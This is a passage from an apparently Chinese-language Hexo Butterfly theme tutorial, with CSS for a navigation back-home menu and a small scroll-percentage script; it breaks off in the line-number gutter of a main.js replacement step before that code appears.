class="built_in">var</span>(--anzhiyu-white) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.back-home-button</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">35px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">35px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line">    <span class="attribute">justify-content</span>: center;</span><br><span class="line">    <span class="attribute">margin-right</span>: <span class="number">4px</span>;</span><br><span class="line">    <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.back-home-button</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.back-menu-list-groups</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">55px</span>;</span><br><span class="line">    <span class="attribute">pointer-events</span>: auto;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.back-home-button</span> <span class="selector-class">.back-menu-list-groups</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">65px</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">var</span>(--anzhiyu-card-bg);</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="built_in">var</span>(--style-border);</span><br><span class="line">    <span class="attribute">flex-direction</span>: column;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">12px</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">var</span>(--anzhiyu-secondtext);</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="built_in">var</span>(--anzhiyu-shadow-border);</span><br><span class="line">    <span class="attribute">transition</span>: <span class="number">0s</span>;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">pointer-events</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.back-home-button</span> <span class="selector-class">.back-menu-list-group</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">flex-direction</span>: column;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.back-home-button</span> <span class="selector-class">.back-menu-list-group</span> <span class="selector-class">.back-menu-list-title</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">8px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">16px</span>;</span><br><span class="line">    <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.back-home-button</span> <span class="selector-class">.back-menu-list</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">flex-direction</span>: column;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.back-home-button</span> <span class="selector-class">.back-menu-list</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: -<span class="number">22px</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">25px</span>;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.back-home-button</span> <span class="selector-class">.back-menu-list-group</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.back-menu-list-title</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.back-home-button</span> <span class="selector-class">.back-menu-list-groups</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="built_in">var</span>(--style-border-hover);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.back-home-button</span> <span class="selector-class">.back-menu-list</span> <span class="selector-class">.back-menu-item</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">4px</span> <span class="number">8px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">4px</span> <span class="number">8px</span> <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.back-home-button</span> <span class="selector-class">.back-menu-list</span> <span class="selector-class">.back-menu-item</span> <span class="selector-class">.back-menu-item-text</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="built_in">var</span>(--global-font-size);</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">0.5rem</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">245</span>, <span class="number">247</span>, <span class="number">233</span>);</span><br><span class="line">    <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-id">#blog_name</span> &#123;</span><br><span class="line">    <span class="attribute">flex-wrap</span>: nowrap;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">60px</span>;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line">    <span class="comment">/* z-index: 102; */</span></span><br><span class="line">    <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.back-home-button</span> <span class="selector-class">.back-menu-list</span> <span class="selector-class">.back-menu-item</span> <span class="selector-class">.back-menu-item-icon</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">24px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">24px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">24px</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">var</span>(--anzhiyu-secondbg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#page-header</span> <span class="selector-id">#nav</span> <span class="selector-class">.back-home-button</span> &#123;</span><br><span class="line">    <span class="attribute">cursor</span>: pointer;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">min-width</span>: <span class="number">1300px</span>) &#123;</span><br><span class="line">    <span class="selector-id">#nav</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">        <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.03</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.back-home-button</span> <span class="selector-class">.back-menu-list</span> <span class="selector-class">.back-menu-item</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.back-menu-item-text</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">var</span>(--anzhiyu-white);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.back-menu-item-icon</span><span class="selector-class">.loading</span> <span class="selector-tag">img</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">25px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#page-header</span> <span class="selector-id">#nav</span> <span class="selector-id">#menus</span> <span class="selector-class">.nav-button</span><span class="selector-class">.long</span> <span class="selector-tag">a</span><span class="selector-class">.totopbtn</span>,</span><br><span class="line"><span class="selector-id">#page-header</span> <span class="selector-id">#nav</span> <span class="selector-id">#menus</span> <span class="selector-class">.nav-button</span><span class="selector-class">.long</span>,</span><br><span class="line"><span class="selector-id">#page-header</span> <span class="selector-id">#nav</span> <span class="selector-id">#menus</span> <span class="selector-class">.nav-button</span><span class="selector-class">.long</span> <span class="selector-tag">a</span><span class="selector-class">.totopbtn</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">70px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#page-header</span> <span class="selector-id">#nav</span> <span class="selector-id">#menus</span> <span class="selector-class">.nav-button</span><span class="selector-class">.long</span> <span class="selector-tag">a</span><span class="selector-class">.totopbtn</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">35px</span>;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">justify-content</span>: center;</span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line">    <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">    <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#page-header</span> <span class="selector-id">#nav</span> <span class="selector-id">#menus</span> <span class="selector-class">.nav-button</span><span class="selector-class">.long</span> <span class="selector-tag">a</span><span class="selector-class">.totopbtn</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">35px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-id">#search-button</span> &#123;</span><br><span class="line">    <span class="attribute">padding-left</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#page-header</span> <span class="selector-id">#nav</span> <span class="selector-class">.nav-button</span> &#123;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">0.5rem</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#page-header</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.is-top-bar</span>) <span class="selector-id">#nav-totop</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#search-button</span> <span class="selector-tag">a</span><span class="selector-class">.site-page</span><span class="selector-class">.social-icon</span><span class="selector-class">.search</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-新建Blog根目录-source-js-nav-menu-js，写入下列代码，将最后一行的”快乐小凳凳”替换为你的名称"><a href="#2-新建Blog根目录-source-js-nav-menu-js，写入下列代码，将最后一行的”快乐小凳凳”替换为你的名称" class="headerlink" title="2. 新建Blog根目录/source/js/nav_menu.js，写入下列代码，将最后一行的”快乐小凳凳”替换为你的名称"></a>2. 新建<code>Blog根目录/source/js/nav_menu.js</code>，写入下列代码，将最后一行的”快乐小凳凳”替换为你的名称</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回顶部 显示网页阅读进度</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onscroll</span> = percent; <span class="comment">// 执行函数</span></span><br><span class="line"><span class="comment">// 页面百分比</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">percent</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollTop</span> || <span class="variable language_">window</span>.<span class="property">pageYOffset</span>, <span class="comment">// 卷去高度</span></span><br><span class="line">    b =</span><br><span class="line">      <span class="title class_">Math</span>.<span class="title function_">max</span>(</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollHeight</span>,</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollHeight</span>,</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">offsetHeight</span>,</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">offsetHeight</span>,</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">clientHeight</span>,</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span></span><br><span class="line">      ) - <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span>, <span class="comment">// 整个网页高度 减去 可视高度</span></span><br><span class="line">    result = <span class="title class_">Math</span>.<span class="title function_">round</span>((a / b) * <span class="number">100</span>), <span class="comment">// 计算百分比</span></span><br><span class="line">    btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#percent&quot;</span>); <span class="comment">// 获取图标</span></span><br><span class="line"></span><br><span class="line">  result &lt;= <span class="number">99</span> || (result = <span class="number">99</span>), (btn.<span class="property">innerHTML</span> = result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;page-name&quot;</span>).<span class="property">innerText</span> = <span class="variable language_">document</span>.<span class="property">title</span>.<span class="title function_">split</span>(<span class="string">&quot; | 快乐小凳凳&quot;</span>)[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><h3 id="3-替换Blog根目录-themes-butterfly-source-js-main-js为下列代码"><a href="#3-替换Blog根目录-themes-butterfly-source-js-main-js为下列代码" class="headerlink" title="3. 替换Blog根目录/themes/butterfly/source/js/main.js为下列代码"></a>3. 替换<code>Blog根目录/themes/butterfly/source/js/main.js</code>为下列代码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span 